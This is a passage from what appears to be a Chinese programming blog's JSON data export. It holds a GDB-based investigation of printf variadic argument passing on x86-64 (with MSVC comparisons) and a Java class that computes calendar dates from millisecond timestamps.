符合预期，与rsi寄存器的东西一样\n\n- 分析结果得到证实\n\n### 探究过程出现的一些问题\n\n- 在不合时宜的时刻检查寄存器的值\n  - 执行完`callq printf`后才检查xmm0、xmm1的内容，企图找到double a\n  - 执行完`callq printf`后才检查rdi、rsi的值。\n- 因为printf函数会使用这些寄存器，所以这样检查必然是不行的\n\n### 关于vc++的一些补充\n\n- [Visual Studio 2015的参数传递文档](https://msdn.microsoft.com/zh-cn/library/zthk2dkh.aspx)\n\n  {% asset_img p8.png %}\n\n  {% asset_img p7.png %}\n\n  ​\t**注意：这里的b不是在xmm0，而是在xmm1，d也是如此**\n\n\n- [Visual Studio 2015 的 Varargs文档 ](https://msdn.microsoft.com//library/dd2wa36c.aspx)\n\n  >  如果参数是通过 vararg（例如省略号参数）传递的，则基本上会应用正常的参数传递过程，包括溢出第五个及后续参数。 此外，被调用方的责任是转储采用其地址的参数。**仅处理浮点值时，如果被调用方要使用整数寄存器中的值，整数寄存器和浮点寄存器才会同时包含浮点值**\n  >\n  >  if parameters are passed via varargs (for example, ellipsis arguments), then essentially the normal parameter passing applies including spilling the fifth and subsequent arguments. It is again the callee's responsibility to dump arguments that have their address taken. **For floating-point values only, both the integer and the floating-point register will contain the float value in case the callee expects the value in the integer registers.**\n\n- 按照我的理解，加粗部分应该是说，如果实参里有integer也有float-point，那么我们在整形寄存器也可以读取到对应序号的浮点寄存器的值，**比如test(3, 2.0, 1)，那么2.0既存在于RDX，也存在于XMM1， 1既存在于R8，也存在于xmm2。**这样，我们使用stdarg的va_arg(ap, long long)读取第二个参数2.0时，就不会出错。如果是gcc，就会出错，因为gcc并不会把浮点放在整形寄存器。\n\n- 这应该是微软为了兼容以前的老代码，以前可变参都是放在栈上，所以改变va_arg的第二个实参type也不会读错，只会形成强制类型转换。（由于手头没有vc++的编译器，只能借助跟师兄的远程合作来探究，所以这里只有部分猜测被证实，读者可以自己测试一下是否在对应序号的整形寄存器和浮点寄存器存在相同的内容）","content":"<h3 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h3>   <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clang version 3.8.1-24 (tags/RELEASE_381/final)</span><br><span class=\"line\">Target: x86_64-pc-linux-gnu</span><br><span class=\"line\">Thread model: posix</span><br><span class=\"line\"></span><br><span class=\"line\">Linux version 4.9.0-deepin13-amd64 (yangbo@deepin.com) (gcc version 6.3.0 20170321 (Debian 6.3.0-11) ) #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19)</span><br></pre></td></tr></table></figure>\n<h3 id=\"奇异现象复现\"><a href=\"#奇异现象复现\" class=\"headerlink\" title=\"奇异现象复现\"></a>奇异现象复现</h3><ul>\n<li><p>代码</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">double</span> a = <span class=\"number\">6.0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%lx\\n\"</span>\t, a);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>执行结果</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p6.png\">\n</li>\n<li><p>这段代码用的运行结果是随机的，无规律的，这是非常奇怪的</p>\n</li>\n</ul>\n<h3 id=\"先说原因\"><a href=\"#先说原因\" class=\"headerlink\" title=\"先说原因\"></a>先说原因</h3><ul>\n<li>printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 <code>a</code> 因为是double类型，所以放在xmm0寄存器。</li>\n</ul>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><ul>\n<li><p>先看glibc-2.26中<code>stdio-common/printf.c</code>的源码</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span></span><br><span class=\"line\">__printf (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *format, ...)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  va_list arg;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> done;</span><br><span class=\"line\"></span><br><span class=\"line\">  va_start (arg, format);</span><br><span class=\"line\">  done = <span class=\"built_in\">vfprintf</span> (<span class=\"built_in\">stdout</span>, format, arg);</span><br><span class=\"line\">  va_end (arg);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以看到，使用的是stdarg的机制实现可变参数传参。</p>\n</li>\n<li><p>如果可变参数完全使用栈帧传递，那么结果不可能是随机的。那么只可能是使用寄存器传参</p>\n</li>\n<li><p>复习一下CSAPP第三章</p>\n <img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p1.png\">\n <img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p2.png\">\n</li>\n<li><p>可以看到，浮点参数的传参使用的是SIMD寄存器，而整形使用的是通用目的寄存器</p>\n</li>\n<li>那么猜测，这应该是问题所在。printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 <code>a</code> 因为是double类型，所以放在xmm0寄存器。</li>\n</ul>\n<h3 id=\"GDB调试\"><a href=\"#GDB调试\" class=\"headerlink\" title=\"GDB调试\"></a>GDB调试</h3><ul>\n<li><p>使用 <code>clang -S d.c &amp;&amp;  clang d.s -g</code>命令编译上面那段问题代码。这样我们就可以在gdb里针对汇编指令设置断点</p>\n</li>\n<li><p>main函数部分汇编代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">subq\t$16, %rsp</span><br><span class=\"line\">movabsq\t$.L.str, %rdi\t\t# .L.str就是&quot;%lx\\n&quot;</span><br><span class=\"line\">movsd\t.LCPI0_0, %xmm0    \t</span><br><span class=\"line\"># 字面量的浮点放在内存，.LCPI0_0引用的就是 double 类型的 6.0</span><br><span class=\"line\">movsd\t%xmm0, -8(%rbp)</span><br><span class=\"line\">movsd\t-8(%rbp), %xmm0        </span><br><span class=\"line\">movb\t$1, %al</span><br><span class=\"line\">callq\tprintf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以看到，double a 确实放在了xmm0,</p>\n</li>\n<li><p>用GDB在 <code>callq printf</code> 处设置断点(注意，运行到断点处，callq printf指令还没有执行)，检查用于传参的前四个通用目的寄存器</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p4.png\">\n<p>（红框内是前四个传参的通用目的寄存器）</p>\n</li>\n<li><p>执行gdb 的<code>next</code>指令 ，运行<code>callq printf</code>这条指令，检查输出</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p3.png\">\n</li>\n<li><p>可以看到，与<code>rsi</code>寄存器的内容一样。可以初步确认，因为格式字符串是”%lx”，所以printf在通用目的寄存器读取可变参数</p>\n</li>\n<li><p>手动修改汇编代码，在callq printf之前加上一条<code>movq $16, %rsi</code>（注意，此处是十进制，而printf使用的格式字符串是”%lx”，所以程序输出的是十六进制）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movabsq\t$.L.str, %rdi</span><br><span class=\"line\">movsd\t.LCPI0_0, %xmm0         # xmm0 = mem[0],zero</span><br><span class=\"line\">movsd\t%xmm0, -8(%rbp)</span><br><span class=\"line\">movsd\t-8(%rbp), %xmm0         # xmm0 = mem[0],zero</span><br><span class=\"line\">movb\t$1, %al</span><br><span class=\"line\">movq    $16, %rsi \t\t\t\t# 这一条就是加上去的</span><br><span class=\"line\">callq\tprintf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>运行，结果是</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p5.png\">\n</li>\n<li><p>符合预期，与rsi寄存器的东西一样</p>\n</li>\n<li><p>分析结果得到证实</p>\n</li>\n</ul>\n<h3 id=\"探究过程出现的一些问题\"><a href=\"#探究过程出现的一些问题\" class=\"headerlink\" title=\"探究过程出现的一些问题\"></a>探究过程出现的一些问题</h3><ul>\n<li>在不合时宜的时刻检查寄存器的值<ul>\n<li>执行完<code>callq printf</code>后才检查xmm0、xmm1的内容，企图找到double a</li>\n<li>执行完<code>callq printf</code>后才检查rdi、rsi的值。</li>\n</ul>\n</li>\n<li>因为printf函数会使用这些寄存器，所以这样检查必然是不行的</li>\n</ul>\n<h3 id=\"关于vc-的一些补充\"><a href=\"#关于vc-的一些补充\" class=\"headerlink\" title=\"关于vc++的一些补充\"></a>关于vc++的一些补充</h3><ul>\n<li><p><a href=\"https://msdn.microsoft.com/zh-cn/library/zthk2dkh.aspx\" target=\"_blank\" rel=\"noopener\">Visual Studio 2015的参数传递文档</a></p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p8.png\">\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p7.png\">\n<p>​    <strong>注意：这里的b不是在xmm0，而是在xmm1，d也是如此</strong></p>\n</li>\n</ul>\n<ul>\n<li><p><a href=\"https://msdn.microsoft.com//library/dd2wa36c.aspx\" target=\"_blank\" rel=\"noopener\">Visual Studio 2015 的 Varargs文档 </a></p>\n<blockquote>\n<p> 如果参数是通过 vararg（例如省略号参数）传递的，则基本上会应用正常的参数传递过程，包括溢出第五个及后续参数。 此外，被调用方的责任是转储采用其地址的参数。<strong>仅处理浮点值时，如果被调用方要使用整数寄存器中的值，整数寄存器和浮点寄存器才会同时包含浮点值</strong></p>\n<p> if parameters are passed via varargs (for example, ellipsis arguments), then essentially the normal parameter passing applies including spilling the fifth and subsequent arguments. It is again the callee’s responsibility to dump arguments that have their address taken. <strong>For floating-point values only, both the integer and the floating-point register will contain the float value in case the callee expects the value in the integer registers.</strong></p>\n</blockquote>\n</li>\n<li><p>按照我的理解，加粗部分应该是说，如果实参里有integer也有float-point，那么我们在整形寄存器也可以读取到对应序号的浮点寄存器的值，<strong>比如test(3, 2.0, 1)，那么2.0既存在于RDX，也存在于XMM1， 1既存在于R8，也存在于xmm2。</strong>这样，我们使用stdarg的va_arg(ap, long long)读取第二个参数2.0时，就不会出错。如果是gcc，就会出错，因为gcc并不会把浮点放在整形寄存器。</p>\n</li>\n<li><p>这应该是微软为了兼容以前的老代码，以前可变参都是放在栈上，所以改变va_arg的第二个实参type也不会读错，只会形成强制类型转换。（由于手头没有vc++的编译器，只能借助跟师兄的远程合作来探究，所以这里只有部分猜测被证实，读者可以自己测试一下是否在对应序号的整形寄存器和浮点寄存器存在相同的内容）</p>\n</li>\n</ul>\n","slug":"printf的一个异常现象引发的对x86-64体系下可变参数传参的探究","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"printf","slug":"printf","permalink":"https://h-zex.github.io/tags/printf/"},{"name":"操作系统","slug":"操作系统","permalink":"https://h-zex.github.io/tags/操作系统/"},{"name":"底层","slug":"底层","permalink":"https://h-zex.github.io/tags/底层/"},{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/tags/CSAPP/"}]},{"title":"从时间戳（毫秒）计算日历","date":"2017-10-02T08:58:15.000Z","path":"2017/10/02/从时间戳（毫秒）计算日历/","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116class MyDate &#123; private int year; private int month; private int day; private int hour; private int minute; private int second; private final long timePerSecond = 1000; private final long timePerMinute = 1000*60; private final long timePerHour = 3600*1000; private final long timePerDay = 24*3600*1000; private final long timePerPingNian = 365*timePerDay; private final long timePerLeapYear = 366*timePerDay; private final long timeOf1970And1971 = timePerPingNian+timePerPingNian; private final long timePer4Year = (long)(365.25*4*timePerDay); private final long timeEvery400Year = timePer4Year*100 - 3*timePerDay; private final long timeOf1970To2000 = timePer4Year*7+timeOf1970And1971; private final int[] daysPerMonth = &#123;31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31&#125;; private boolean setMinuteAndSecond(long milliTime) &#123; assert milliTime&lt;timePerDay; if(milliTime&gt;=timePerDay) return false; hour = (int)(milliTime/timePerHour); long t = milliTime%timePerHour; minute = (int)(t/timePerMinute); t = t%timePerMinute; second = (int)(t/timePerSecond); return true; &#125; private boolean setMonthAndDay(long milliTime, boolean isLeapYear) &#123; //this func should handle the case where milliTime == 0; //this func get the milliseconds within 1 year; assert milliTime&lt;=timePerLeapYear &amp;&amp; isLeapYear || milliTime&lt;=timePerPingNian &amp;&amp; !isLeapYear; if(milliTime&gt;timePerLeapYear &amp;&amp; isLeapYear || milliTime&gt;timePerPingNian &amp;&amp; !isLeapYear) &#123; return false; &#125; daysPerMonth[1] = isLeapYear ? 29 : 28; //set the days of February; int cnt = -1; do&#123; milliTime -= daysPerMonth[++cnt]*timePerDay; &#125;while (milliTime&gt;=0); month = cnt+1; //for that the cnt begin from 0, but month begin from 1; long timeOfLastMonth = daysPerMonth[cnt]*timePerDay+milliTime; day = (int)(timeOfLastMonth/timePerDay)+1; setMinuteAndSecond(timeOfLastMonth % timePerDay); return true; &#125; private boolean setDataFile(long milliTime) &#123; if(milliTime&lt;0) return false; boolean is1970Or1971 = milliTime&lt;timeOf1970And1971 ? true : false; boolean is20Century = milliTime&lt;timeOf1970To2000 ? true: false; //if equal is 2000 1 1 0:0:0 if(is1970Or1971) &#123; year = milliTime&gt;=timePerPingNian ? 1971 : 1970; setMonthAndDay(year==1971 ? milliTime-timePerPingNian : milliTime, false); return true; &#125; if(is20Century) &#123; long t = (milliTime-timeOf1970And1971)/timePer4Year; long t1 = milliTime-timeOf1970And1971-t*timePer4Year; long t2 = t1-timePerLeapYear; boolean isLeapYear = t2&lt;0; long t3 = isLeapYear ? 0 : t2/timePerPingNian+1; year = (int)(1972+t*4+t3); long l = isLeapYear ? t1 : (t1-t3*timePerPingNian-timePerDay); setMonthAndDay(l, isLeapYear); return true; &#125; long p = milliTime-timeOf1970To2000; long t1 = p/timeEvery400Year; long p1 = p-t1*timeEvery400Year; long t2 = p1/timePer4Year; long tN = t2/25; //in every 400 years, other year such as xy00(y!=0) is not leap year; long p2 = p1-t2*timePer4Year; p2 += tN*timePerDay; long t3 = p2-timePerLeapYear; boolean isLeapYear = t3&lt;0; long t4 = isLeapYear ? 0 : t3/timePerPingNian+1; year = (int)(2000+t1*400+t2*4+t4); long lt = isLeapYear ? p2 : (p2-t4*timePerPingNian-timePerDay); setMonthAndDay(lt, isLeapYear); return true; &#125;&#125; 思路设置时分秒（函数setMinuteAndSecond） 函数的输入是 小于 每天毫秒数 的一个整数 因为是从0:0:0开始计时，所以很好算 直接除以每小时毫秒数，结果就是 要求的小时数 然后把取模每小时毫秒数的结果除以每分钟毫秒数，算出来的结果就是分钟数 以此类推，算出秒数 设置月和日（函数setMonthAndDay） 函数的输入为 小于 每年毫秒数 一个整数 依次减去每个月的毫秒数，当减去某个月后，得到负数，说明月份就是这个月。注意，如果减去后得到0，则是下个月的第一毫秒，因为毫秒数是相对1970.1.1.0:0:0计算的。举个例子，毫秒数==一个平年的毫秒数，那么加上1970.1.1.0:0:0后，就变成1971.1.1.0:0:0，而不是1970.12.31.23:59:59 通过上面那个流程，得到属于一个月内的毫秒数（注意，比如说某个月的毫秒数是K，那么0~(K-1)都是属于这个月，但是K不是），然后除以每天的毫秒数，得到 P 。同样，如果整除，说明日期数是 P+1，如果不整除，那也是 P+1（注意，日期是从1开始，而不是从0开始） 设置年份（在函数setDataFile中） 对1970/1971特殊处理，直接判断是否毫秒数是否 $\\geq$ 一个平年的毫秒数，如果是，那么就是1971。注意，等于也是，原因如上所述。然后调用setMonthAndDay函数，设置日月 对1972.1.1.0:0:0到2000.1.1.0:0:0 特殊处理。先减去1970和1971的总的毫秒数，得到的结果除以每4年的毫秒数，得到H。同样，无论是否整除，年份数是在$[4H+1972, 4H+1972+3]$，整除就是$4H+1972$这一年的第一毫秒（0时0分0秒）。因为1970.1.1.0:0:0加上1970和1971总的毫秒数已经是1972.1.1.0:0:0了，再加上整数年$4H$就是(1972+4H).1.1.0:0:0了。 然后减去一个闰年的毫秒数，因为从1972年算起，每四年的第一年都是闰年，如果结果是负数，说明是闰年（同样的，如果是0，那么并不是闰年，而是闰年下一年的第一毫秒）。否则，把得到结果除以每个平年的毫秒数得到 P ，就是从闰年的下一年 开始的第 P 年，所以，年份就是$1972+4H+1+P$ 然后，因为当年份数是100的倍数时，只有当年份可以被400整除，才是闰年。而2000年正好就是每400年里的第一年，所以要先计算，毫秒数里总的有多少个400年，如果有 $t$ 个，那么年份数就是$[2000+400t, 2000+400t+399]$ 接下来就计算总的毫秒数减去1970到2000的毫秒数，再减去总共多少个400年的毫秒数，剩下的毫秒数里，算算有多少个4年，因为每4年是闰年。如果算出来的结果是$d$，那么年份数就是$[2000+400t+4d,2000+400t+4d+3]$ 接下来判断剩下的毫秒数是否小于一个闰年的毫秒数，如果是，那么就是闰年，年份数是$2000+400t+4d$。如果不是，就减去一个闰年的毫秒数，然后算一算剩下的有多少个平年的毫秒数，假设算出来的结果是$b$，那么年份数就是$2000+400t+4d+b+1$ 接下来调用setMonthAndDay函数设置月份日期","raw":"---\ntitle: 从时间戳（毫秒）计算日历\ntoc: \ncomments: true\nmathjax: true\ndate: 2017-10-02 16:58:15\ntags:\n- 时间戳\n- 日历\n- 算法\ndescription:\n- 从时间戳（毫秒）计算日历\ncategories:\n- 算法\n---\n\n```java\nclass MyDate {\n    private int year;\n    private int month;\n    private int day;\n    private int hour;\n    private int minute;\n    private int second;\n\n    private final long timePerSecond = 1000;\n    private final long timePerMinute = 1000*60;\n    private final long timePerHour = 3600*1000;\n    private final long timePerDay = 24*3600*1000;\n    private final long timePerPingNian = 365*timePerDay;\n    private final long timePerLeapYear = 366*timePerDay;\n    private final long timeOf1970And1971 = timePerPingNian+timePerPingNian;\n    private final long timePer4Year = (long)(365.25*4*timePerDay);\n    private final long timeEvery400Year = timePer4Year*100 - 3*timePerDay;\n    private final long timeOf1970To2000 = timePer4Year*7+timeOf1970And1971;\n    private final int[] daysPerMonth = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};\n\n    private boolean setMinuteAndSecond(long milliTime) {\n\n        assert milliTime<timePerDay;\n        if(milliTime>=timePerDay)\n            return false;\n\n        hour = (int)(milliTime/timePerHour);\n        long t = milliTime%timePerHour;\n        minute = (int)(t/timePerMinute);\n        t = t%timePerMinute;\n        second = (int)(t/timePerSecond);\n\n        return true;\n    }\n\n    private boolean setMonthAndDay(long milliTime, boolean isLeapYear) {\n\n        //this func should handle  the case where milliTime == 0;\n        //this func get the milliseconds within 1 year;\n\n        assert milliTime<=timePerLeapYear && isLeapYear || milliTime<=timePerPingNian && !isLeapYear;\n        if(milliTime>timePerLeapYear && isLeapYear || milliTime>timePerPingNian && !isLeapYear) {\n            return false;\n        }\n\n        daysPerMonth[1] = isLeapYear ? 29 : 28; //set the days of February;\n\n        int cnt = -1;\n\n        do{\n            milliTime -= daysPerMonth[++cnt]*timePerDay;\n        }while (milliTime>=0);\n\n        month = cnt+1;  //for that the cnt begin from 0, but month begin from 1;\n        long timeOfLastMonth = daysPerMonth[cnt]*timePerDay+milliTime;\n        day = (int)(timeOfLastMonth/timePerDay)+1;\n\n        setMinuteAndSecond(timeOfLastMonth % timePerDay);\n\n        return true;\n    }\n\n    private boolean setDataFile(long milliTime) {\n        if(milliTime<0)\n            return false;\n\n        boolean is1970Or1971 = milliTime<timeOf1970And1971 ? true : false;\n        boolean is20Century = milliTime<timeOf1970To2000 ? true: false; \n       \t//if equal is 2000 1 1 0:0:0\n\n        if(is1970Or1971) {\n            year = milliTime>=timePerPingNian ? 1971 : 1970;\n            setMonthAndDay(year==1971 ? milliTime-timePerPingNian : milliTime, false);\n            return true;\n        }\n\n        if(is20Century) {\n            long t = (milliTime-timeOf1970And1971)/timePer4Year;  \n            long t1 = milliTime-timeOf1970And1971-t*timePer4Year;\n\n            long t2 = t1-timePerLeapYear;\n            boolean isLeapYear = t2<0;\n            long t3 = isLeapYear ? 0 : t2/timePerPingNian+1;\n\n            year = (int)(1972+t*4+t3);\n\n            long l = isLeapYear ? t1 : (t1-t3*timePerPingNian-timePerDay);\n            setMonthAndDay(l, isLeapYear);\n\n            return true;\n        }\n\n        long p = milliTime-timeOf1970To2000;\n\n        long t1 = p/timeEvery400Year;\n        long p1 = p-t1*timeEvery400Year;\n\n        long t2 = p1/timePer4Year;\n        long tN = t2/25;    \n      \t//in every 400 years, other year such as xy00(y!=0) is not leap year;\n        \n      \tlong p2 = p1-t2*timePer4Year;\n        p2 += tN*timePerDay;\n\n        long t3 = p2-timePerLeapYear;\n\n        boolean isLeapYear = t3<0;\n        long t4 = isLeapYear ? 0 : t3/timePerPingNian+1;\n\n        year = (int)(2000+t1*400+t2*4+t4);\n\n        long lt = isLeapYear ? p2 : (p2-t4*timePerPingNian-timePerDay);\n        setMonthAndDay(lt, isLeapYear);\n        return true;\n    }\n}\n```\n\n### 思路\n\n#### 设置时分秒（函数setMinuteAndSecond）\n\n- 函数的输入是 小于 每天毫秒数  的一个整数\n- 因为是从0:0:0开始计时，所以很好算\n- 直接除以每小时毫秒数，结果就是 要求的小时数\n- 然后把取模每小时毫秒数的结果除以每分钟毫秒数，算出来的结果就是分钟数\n- 以此类推，算出秒数\n\n#### 设置月和日（函数setMonthAndDay）\n\n- 函数的输入为  小于  每年毫秒数  一个整数\n- 依次减去每个月的毫秒数，当减去某个月后，得到负数，说明月份就是这个月。**注意，如果减去后得到0，则是下个月的第一毫秒，因为毫秒数是相对1970.1.1.0:0:0计算的。举个例子，毫秒数==一个平年的毫秒数，那么加上1970.1.1.0:0:0后，就变成1971.1.1.0:0:0，而不是1970.12.31.23:59:59**\n- 通过上面那个流程，得到属于一个月内的毫秒数（注意，比如说某个月的毫秒数是K，那么0~(K-1)都是属于这个月，但是K不是），然后除以每天的毫秒数，得到 P 。同样，如果整除，说明日期数是 P+1，如果不整除，那也是 P+1（注意，日期是从1开始，而不是从0开始）\n\n#### 设置年份（在函数setDataFile中）\n\n- 对1970/1971特殊处理，直接判断是否毫秒数是否 $\\geq$ 一个平年的毫秒数，如果是，那么就是1971。**注意，等于也是，原因如上所述。**然后调用setMonthAndDay函数，设置日月\n\n- 对1972.1.1.0:0:0到2000.1.1.0:0:0 特殊处理。先减去1970和1971的总的毫秒数，得到的结果除以每4年的毫秒数，得到H。同样，无论是否整除，年份数是在$[4H+1972, 4H+1972+3]$，整除就是$4H+1972$这一年的第一毫秒（0时0分0秒）。因为1970.1.1.0:0:0加上1970和1971总的毫秒数已经是1972.1.1.0:0:0了，再加上整数年$4H$就是(1972+4H).1.1.0:0:0了。\n\n  然后减去一个闰年的毫秒数，因为从1972年算起，每四年的第一年都是闰年，如果结果是负数，说明是闰年（同样的，如果是0，那么并不是闰年，而是闰年下一年的第一毫秒）。否则，把得到结果除以每个平年的毫秒数得到 P ，就是从闰年的下一年 开始的第 P 年，所以，年份就是$1972+4H+1+P$\n\n- 然后，因为当年份数是100的倍数时，只有当年份可以被400整除，才是闰年。而2000年正好就是每400年里的第一年，所以要先计算，毫秒数里总的有多少个400年，如果有 $t$ 个，那么年份数就是$[2000+400t, 2000+400t+399]$\n\n  接下来就计算总的毫秒数减去1970到2000的毫秒数，再减去总共多少个400年的毫秒数，剩下的毫秒数里，算算有多少个4年，因为每4年是闰年。如果算出来的结果是$d$，那么年份数就是$[2000+400t+4d,2000+400t+4d+3]$\n\n  接下来判断剩下的毫秒数是否小于一个闰年的毫秒数，如果是，那么就是闰年，年份数是$2000+400t+4d$。如果不是，就减去一个闰年的毫秒数，然后算一算剩下的有多少个平年的毫秒数，假设算出来的结果是$b$，那么年份数就是$2000+400t+4d+b+1$\n\n  接下来调用setMonthAndDay函数设置月份日期","content":"<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyDate</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> year;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> month;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> day;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> hour;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> minute;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> second;</span><br><span class=\"line\"></span><br><span class=\"line\">    